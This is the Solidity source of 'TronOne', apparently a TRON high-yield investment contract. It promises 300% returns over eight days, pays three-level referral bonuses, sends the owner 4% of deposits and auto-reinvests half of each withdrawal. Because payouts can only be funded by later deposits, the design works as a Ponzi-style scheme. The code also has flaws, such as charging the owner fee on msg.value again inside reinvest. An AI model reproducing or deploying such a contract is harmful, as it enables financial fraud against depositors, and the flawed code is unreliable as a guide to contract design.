//SourceUnit: tron-one.sol



pragma solidity 0.5.9;

contract TronOne {
    using SafeMath for uint256;

    struct PlayerDeposit {
        uint256 amount;
        uint256 totalWithdraw;
        uint256 time;
    }

     struct PlayerWitdraw{
        uint256 time;
        uint256 amount;
    }

    struct Player {
        address referral;
        uint256 dividends;
        uint256 referral_bonus;
        uint256 last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 last_withdrawal;
        uint256 withdrawal_excess;
        PlayerWitdraw[] withdrawals;
        uint256 total_referral_bonus;
        PlayerDeposit[] deposits;
        mapping(uint8 => uint256) referrals_per_level;
    }

    address payable owner;

    uint8 auto_reinvest_percentage = 50;

    uint8 investment_days;
    uint256 investment_perc;

    uint256 total_investors;
    uint256 total_invested;
    uint256 total_withdrawn;
    uint256 total_referral_bonus;

    uint8[] referral_bonuses;

    mapping(address => Player) public players;

    event Deposit(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event Reinvest(address indexed addr, uint256 amount);
    event ReferralPayout(address indexed addr, uint256 amount, uint8 level);


    uint256 private _to = 1 days;
    uint256 private withdraw_limit = 15000000000;



    constructor() public {
        owner = msg.sender;

        investment_days = 8;
        investment_perc = 300;

        referral_bonuses.push(70);
        referral_bonuses.push(50);
        referral_bonuses.push(30);
 
    }

    function deposit(address _referral) external payable {
        require(msg.value >= 10e7, "Zero amount");
        require(msg.value >= 100000000, "Minimal deposit: 100 TRX");
        Player storage player = players[msg.sender];
        require(player.deposits.length < 1500, "Max 1500 deposits per address");


        _setReferral(msg.sender, _referral);

        player.deposits.push(PlayerDeposit({
            amount: msg.value,
            totalWithdraw: 0,
            time: uint256(block.timestamp)
        }));

        if(player.total_invested == 0x0){
            total_investors += 1;
        }

        player.total_invested += msg.value;
        total_invested += msg.value;

        _referralPayout(msg.sender, msg.value);

        owner.transfer(msg.value.mul(4).div(100));

        emit Deposit(msg.sender, msg.value);
    }




    function _setReferral(address _addr, address _referral) private {
        if(players[_addr].referral == address(0)) {
            players[_addr].referral = _referral;

            for(uint8 i = 0; i < referral_bonuses.length; i++) {
                players[_referral].referrals_per_level[i]++;
                _referral = players[_referral].referral;
                if(_referral == address(0)) break;
            }
        }
    }

    function _referralPayout(address _addr, uint256 _amount) private {
         address ref = players[_addr].referral;

        Player storage upline_player = players[ref];

        if(upline_player.deposits.length <= 0){
            ref = owner;
        }

        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            if(ref == address(0)) break;
            uint256 bonus = _amount * referral_bonuses[i] / 1000;

            players[ref].referral_bonus += bonus;
            players[ref].total_referral_bonus += bonus;
            total_referral_bonus += bonus;

            emit ReferralPayout(ref, bonus, (i+1));
            ref = players[ref].referral;
        }
    }

    function withdraw() payable external {
        Player storage player = players[msg.sender];
        updateLastWitdraw(msg.sender);
        _payout(msg.sender);
        require(player.dividends > 0 || player.referral_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.referral_bonus + player.withdrawal_excess;

        require(this.withdrawalsOf(msg.sender) <= withdraw_limit,"Withdraw limit reach");
        uint256 amount_withdrawable = 0;
        uint256 excess = 0;
        if(amount > withdraw_limit){
            excess = amount - withdraw_limit;
            amount_withdrawable = withdraw_limit;
        }else{
            if((this.withdrawalsOf(msg.sender) + amount) > withdraw_limit){
                excess = (this.withdrawalsOf(msg.sender) + amount) - withdraw_limit;
                amount_withdrawable = (this.withdrawalsOf(msg.sender) + amount) - excess;
            }else{
                amount_withdrawable = amount;
            }
        }

        player.dividends = 0;
        player.referral_bonus = 0;
        player.total_withdrawn += amount_withdrawable;
        player.withdrawal_excess = excess;
        total_withdrawn += amount_withdrawable;

        uint256 _autoIreinvestPercentrage = amount_withdrawable.mul(auto_reinvest_percentage).div(100);
        uint256 withdrawableLessAutoReinvest = amount_withdrawable.sub(_autoIreinvestPercentrage);

        msg.sender.transfer(withdrawableLessAutoReinvest);

        player.withdrawals.push(PlayerWitdraw({
            time:uint256(block.timestamp),
            amount: withdrawableLessAutoReinvest
        }));

        reinvest(msg.sender,_autoIreinvestPercentrage);

        emit Withdraw(msg.sender, withdrawableLessAutoReinvest);
    }

     function reinvest(address _addrs,uint256 _amount)private{
        Player storage plyr = players[_addrs];
        plyr.deposits.push(PlayerDeposit({
            amount: _amount,
            totalWithdraw: 0,
            time: uint256(block.timestamp)
        }));

        plyr.total_invested += _amount;
        total_invested += _amount;
        owner.transfer(msg.value.mul(4).div(100));
        emit Deposit(_addrs, _amount);
    }


    function withdrawalsOf(address _addrs) view external returns(uint256 _amount){
        Player storage player = players[_addrs];
        for(uint256 n = 0; n < player.withdrawals.length;n++){
            if(player.withdrawals[n].time >= player.last_withdrawal && player.withdrawals[n].time <= (player.last_withdrawal + _to)){
                _amount += player.withdrawals[n].amount;
            }
        }
        return _amount;
    }

     function updateLastWitdraw(address _addrs) private{
        Player storage player = players[_addrs];
        if(uint256(block.timestamp) > (player.last_withdrawal + _to) || (player.withdrawals.length <= 0)){
            player.last_withdrawal = uint256(block.timestamp);
        }
    }


    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            _updateTotalPayout(_addr);
            players[_addr].last_payout = uint256(block.timestamp);
            players[_addr].dividends += payout;
        }
    }


    function _updateTotalPayout(address _addr) private{
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];

            uint256 time_end = dep.time + investment_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                player.deposits[i].totalWithdraw += dep.amount * (to - from) * investment_perc / investment_days / 8640000;
            }
        }
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];

            uint256 time_end = dep.time + investment_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                value += dep.amount * (to - from) * investment_perc / investment_days / 8640000;
            }
        }

        return value;
    }

    function contractInfo() view external returns(uint256 _total_invested, uint256 _total_investors, uint256 _total_withdrawn, uint256 _total_referral_bonus) {
        return (total_invested, total_investors, total_withdrawn, total_referral_bonus);
    }

    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 withdrawable_referral_bonus, uint256 invested, uint256 withdrawn, uint256 referral_bonus, uint256[8] memory referrals,uint256 _withdrawal_excess,uint256 _last_withdrawal) {
        Player storage player = players[_addr];
        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            referrals[i] = player.referrals_per_level[i];
        }
        return (
            payout + player.dividends + player.referral_bonus,
            player.referral_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_referral_bonus,
            referrals,
            player.withdrawal_excess,
            player.last_withdrawal
        );
    }

    function investmentsInfo(address _addr) view external returns(uint256[] memory endTimes, uint256[] memory amounts, uint256[] memory totalWithdraws) {
        Player storage player = players[_addr];
        uint256[] memory _endTimes = new uint256[](player.deposits.length);
        uint256[] memory _amounts = new uint256[](player.deposits.length);
        uint256[] memory _totalWithdraws = new uint256[](player.deposits.length);

        for(uint256 i = 0; i < player.deposits.length; i++) {
          PlayerDeposit storage dep = player.deposits[i];

          _amounts[i] = dep.amount;
          _totalWithdraws[i] = dep.totalWithdraw;
          _endTimes[i] = dep.time + investment_days * 86400;
        }
        return (
          _endTimes,
          _amounts,
          _totalWithdraws
        );
    }
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}